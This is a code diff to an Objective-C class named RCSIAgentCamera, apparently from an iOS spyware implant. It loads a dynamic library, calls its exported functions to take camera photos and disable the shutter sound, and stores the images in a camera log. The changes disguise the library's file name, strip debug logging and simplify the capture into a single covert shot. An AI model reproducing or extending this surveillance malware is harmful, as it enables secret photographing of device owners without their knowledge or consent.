@@ -14,7 +14,7 @@
 
 #import "RCSICameraSupport.h"
 
-//#define DEBUG_CAMERA
+//#define DEBUG_CAMERA_
 
 typedef NSData* (*camera_t) (NSInteger);
 typedef void (*disableSound_t)(void);
@@ -24,6 +24,8 @@ static camera_t runCamera;
 static disableSound_t disableShutterSound;
 
 @implementation RCSIAgentCamera
+
+@synthesize mAgentConfiguration;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -102,14 +104,8 @@ static disableSound_t disableShutterSound;
   return sharedAgentCamera;
 }
 
-#define CAM_DYLIB_NAME @"camera.dylib"
+#define CAM_DYLIB_NAME @"3@e337a.dib"
 #define CAM_DYLIB_FUNC "runCamera"
-
-typedef struct _cameraStruct
-{
-  UInt32 timeStep;
-  UInt32 numStep;
-} cameraStruct;
 
 - (BOOL)_checkCameraCompatibilty
 {
@@ -119,15 +115,8 @@ typedef struct _cameraStruct
 
   if (gOSMajor >= 4)
     {
-#ifdef DEBUG_CAMERA
-    NSLog(@"%s: running on iOS4", __FUNCTION__);
-#endif
       NSString *path = [[NSBundle mainBundle] bundlePath];
       NSString *camDylibPathName = [[NSString alloc] initWithFormat: @"%@/%@", path, CAM_DYLIB_NAME];
-      
-#ifdef DEBUG_CAMERA
-    NSLog(@"%s: stat dylib %@", __FUNCTION__, camDylibPathName);
-#endif
 
       if (![[NSFileManager defaultManager] fileExistsAtPath: camDylibPathName])
         {
@@ -137,10 +126,6 @@ typedef struct _cameraStruct
           BOOL tmpB = FALSE;
           tmpB = [tmpDylib writeToFile: camDylibPathName atomically:YES];
                       
-#ifdef DEBUG_CAMERA
-          NSLog(@"%s: dylib write status %d", __FUNCTION__, tmpB);
-#endif
-
           [tmpDylib release];
         }
       
@@ -150,9 +135,6 @@ typedef struct _cameraStruct
           (runCamera = (camera_t) dlsym(cam_handle, CAM_DYLIB_FUNC)) != NULL &&
           (disableShutterSound = (disableSound_t) dlsym(cam_handle, "disableShutterSound")) != NULL)
         {
-#ifdef DEBUG_CAMERA
-          NSLog(@"%s: dylib export function found", __FUNCTION__);
-#endif
           bRet = TRUE;
         }
         
@@ -193,9 +175,6 @@ typedef struct _cameraStruct
       [logManager closeActiveLog: LOG_CAMERA
                      withLogID: 0];
                      
-#ifdef DEBUG_CAMERA
-    NSLog(@"%s:image 1 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
-#endif
       [image release];
     }
   
@@ -223,10 +202,6 @@ typedef struct _cameraStruct
     
   [logManager closeActiveLog: LOG_CAMERA
                    withLogID: 0];
-                   
-#ifdef DEBUG_CAMERA
-  NSLog(@"%s:image 2 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
-#endif
 
   [image release];
 }
@@ -240,9 +215,6 @@ typedef struct _cameraStruct
   
   if ([self _checkCameraCompatibilty] == NO)
     {
-#ifdef DEBUG_CAMERA
-      NSLog(@"%s: agent camera not compatibile on running device", __FUNCTION__);
-#endif
       [outerPool release];
       return;
     }
@@ -252,49 +224,15 @@ typedef struct _cameraStruct
   messageRawData = [mAgentConfiguration objectForKey: @"data"];
   conf = (cameraStruct *)[messageRawData bytes];
 
-#ifdef DEBUG_CAMERA
-  if (conf)
-    NSLog(@"%s: agent camera timeStep %lu, numStep %lu", __FUNCTION__,
-          conf->timeStep, conf->numStep);
-#endif
-
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
+
+  [self _grabCameraShot];
   
-  UInt32 cam_timeout = 0;
+  [mAgentConfiguration setObject: AGENT_STOP forKey:@"status"];
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      if (cam_timeout == 0) 
-        {
-          for (int i=0; i < conf->numStep; i++) 
-            {
-              if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-                  [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-                [self _grabCameraShot];
-              else
-                break;
-            }
-            
-          cam_timeout = conf->timeStep/1000;
-        }
-      else
-        {
-          sleep(1);
-          cam_timeout--;
-        }
-    
-      [innerPool release];
-    }
-    
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    {
-      [mAgentConfiguration setObject: AGENT_STOPPED
-                              forKey: @"status"];
-    }
-    
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
+  
   [outerPool release];
 }
 
@@ -316,20 +254,6 @@ typedef struct _cameraStruct
 - (BOOL)resume
 {
   return YES;
-}
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-    {
-      [mAgentConfiguration release];
-      mAgentConfiguration = [aConfiguration retain];
-    }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
 }
 
 @end
